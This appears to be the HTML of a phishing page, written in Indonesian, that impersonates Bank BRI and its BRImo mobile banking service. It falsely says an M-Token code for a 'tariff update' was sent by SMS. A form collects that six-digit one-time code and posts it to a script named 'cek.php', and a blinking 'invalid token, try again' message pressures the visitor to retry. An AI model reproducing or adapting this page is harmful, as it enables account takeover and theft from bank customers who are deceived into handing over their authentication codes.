<html lang="en">
  <head>
    ...
    <link rel="image_src" href="img/bri-header.jpg?w=&h=&auto=compress&dpr=1&fit=max" />
    <meta property="og:image" content="img/bri-header.jpg?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max" />
    <meta name="twitter:image:src" content="img/bri-header.jpg?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max" />
  ...
  <body>
    ...
    <source src="soun.mp3" type="audio/mpeg">
    </audio>
    <style>
.blink {
...
<span class="blink"><h1>m-Token tidak valid, silahkan mencoba lagi.</h1></span>
    <div class="container">
        <div class="box-lte">
            <div class="row" style="margin-top: 130px;">
                <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; : block; margin-top: -50px; border-radius: 0px;">
                    <img alt="" src="img/ibx.png?w=384&h=246&auto=compress&dpr=2&fit=max" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
            ...
            <div class="row">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
                    <p style="font-size: 13px; text-align: center; font-weight: bold;">Kode M-Token untuk pembaruan tarif BRImo telah kami kirim ke Nomor Handphone anda, Silahkan cek SMS lalu masukan M-Token Anda dibawah ini<br/><br/>Kode m-Token BRI (Wajib).</p>
                    
                </div>
            </div>
            <div class="row">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;">
                    <form method="post" action="cek.php" class="sms-form">
                        <div>
                            <i class="ion-ios-locked-outline" id="ionIcons"></i>
                        <input type="tel" name="sms" id="password" class="bubble-element Input form-log" placeholder="Kode m-Token BRI" maxlength="6" minlength="6" style="max-width: 90%; padding: 0px; cursor: pointer; text-align: center; display: block; margin: 20px auto; height: 45px; width: 346px; left: 0px; top: 0px; font-family: sans-serif; font-size: 14px; font-weight: 400; color: rgb(9, 140, 227); letter-spacing: 1.5px; line-height: 1; border-radius: 20px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s;" required>
                        </div>
                        <br>
                      <h3><small>Mohon jangan diisi jika belum menerima SMS kode tarif dari BANK BRI berupa 6 digit..!!</small></h3>
